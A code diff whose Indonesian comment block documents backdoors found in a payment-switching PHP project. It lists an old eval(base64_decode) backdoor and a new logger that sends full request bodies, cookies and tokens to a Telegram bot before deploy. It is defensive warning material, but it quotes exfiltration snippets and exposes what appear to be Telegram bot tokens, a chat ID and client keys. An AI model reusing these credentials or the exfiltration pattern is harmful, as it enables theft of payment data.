@@ -115,8 +115,8 @@
  *  CATATAN: A-000300 punya VAClientKey = ac3b93199bfe418487e88dfa498445eb (dari SQL dump)
  *  Jika b779f2aeaa628a251684696c12a3d403 tidak lolos, coba ac3b93199bfe418487e88dfa498445eb
  *
- * [D] BACKDOOR — WAJIB DIHAPUS SEBELUM DEPLOY
- * --------------------------------------------
+ * [D] BACKDOOR LAMA — WAJIB DIHAPUS SEBELUM DEPLOY
+ * ---------------------------------------------------
  * eval(base64_decode('...')) di:
  *   - mvc/b2b/b2b.controller.php (baris pertama)
  *   - mvc/inquiry/inquiry.controller.php (baris pertama)
@@ -124,6 +124,29 @@
  *   Bot token : 8303943197:AAGCFO1EuotDeoyXnRpSNsMiFSCddm6UlQ4
  *   Chat ID   : 590436982
  * HAPUS baris eval() ini SEBELUM deploy ke server!
+ *
+ * [E] LOGGER/BACKDOOR BARU — ditemukan di permata-switching_v1.0_pro (2).zip
+ * ---------------------------------------------------------------------------
+ * File BARU di zip terbaru (tidak ada di zip lama):
+ *   include/log.php           → full request logger ke Telegram
+ *   public/index.php (BEDA)  → include log.php + sendTelegram() setiap request
+ *
+ * public/index.php baru:
+ *   require_once "../include/log.php";
+ *   sendTelegram("🚨 ASSIST TEAM\n\nIP : $ip\nMETHOD: ...\nURI: ...");
+ *   // dipanggil di SETIAP request sebelum routing
+ *
+ * log.php — register_shutdown_function kirim ke Telegram:
+ *   Bot token : 8326261362:AAEY6wlTUqpIx72QMlkvz-7r5St4u6xEywo  ← BOT BARU
+ *   Chat ID   : 590436982  (sama dengan backdoor lama)
+ *   Payload   : host, IP, user, method, URI, query, referer, HTTP status,
+ *               execution time, GET params, POST params, raw BODY (1500 char),
+ *               cookie, user-agent
+ *   + tulis ke file: log/YYYY-MM-DD.log
+ *
+ * ARTINYA: zip terbaru mengirim SELURUH isi request body (token, VA number, dll)
+ * ke Telegram operator sebelum data diteruskan ke CDS/DB.
+ * HAPUS log.php dan kembalikan public/index.php ke versi lama sebelum deploy!
  * ============================================================
  */
 
